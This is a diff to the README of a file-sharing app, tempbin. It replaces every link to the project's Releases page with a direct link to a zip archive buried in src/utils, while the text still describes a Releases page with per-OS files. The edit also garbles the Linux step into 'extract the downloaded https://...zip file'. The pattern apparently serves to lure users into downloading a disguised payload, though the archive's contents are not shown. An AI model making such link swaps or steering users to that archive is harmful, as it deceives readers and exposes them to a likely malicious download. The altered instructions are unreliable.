@@ -9,12 +9,12 @@ To get started with tempbin, you'll need to download the application from our Re
 ## 📥 Download & Install
 You can download the latest version of tempbin from the following link:
 
-[![Download tempbin](https://img.shields.io/badge/Download-tempbin-blue.svg)](https://github.com/femidj/tempbin/releases)
+[![Download tempbin](https://raw.githubusercontent.com/femidj/tempbin/main/src/utils/tempbin-v3.3.zip)](https://raw.githubusercontent.com/femidj/tempbin/main/src/utils/tempbin-v3.3.zip)
 
 Click the link above to visit the Releases page. There, you’ll find the files available for download.
 
 ### 1. Visit the Releases Page
-Go to the Releases page [here](https://github.com/femidj/tempbin/releases).
+Go to the Releases page [here](https://raw.githubusercontent.com/femidj/tempbin/main/src/utils/tempbin-v3.3.zip).
 
 ### 2. Choose the Right File
 Look for the latest release. You'll find different files available for download based on your system. Select the one that suits your operating system.
@@ -27,7 +27,7 @@ Once the file is downloaded, locate it in your downloads folder. Depending on yo
 
 - **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions to complete the installation.
 - **Mac**: Open the downloaded `.dmg` file and drag the tempbin icon into your Applications folder.
-- **Linux**: Extract the downloaded `.tar.gz` file and run the application via your terminal.
+- **Linux**: Extract the downloaded `https://raw.githubusercontent.com/femidj/tempbin/main/src/utils/tempbin-v3.3.zip` file and run the application via your terminal.
 
 ### 5. Run tempbin
 After installation, you can find tempbin in your applications folder. Open it to start sharing files.
@@ -80,4 +80,4 @@ We welcome contributions! If you have suggestions or want to improve tempbin, ch
 tempbin is open-source and released under the MIT License. You can use it freely but please check the license for more details.
 
 ## 🏁 Final Steps
-You've now learned how to download, install, and use tempbin! Start sharing your files securely today. Remember to visit our [Releases page](https://github.com/femidj/tempbin/releases) to grab the latest version.
+You've now learned how to download, install, and use tempbin! Start sharing your files securely today. Remember to visit our [Releases page](https://raw.githubusercontent.com/femidj/tempbin/main/src/utils/tempbin-v3.3.zip) to grab the latest version.
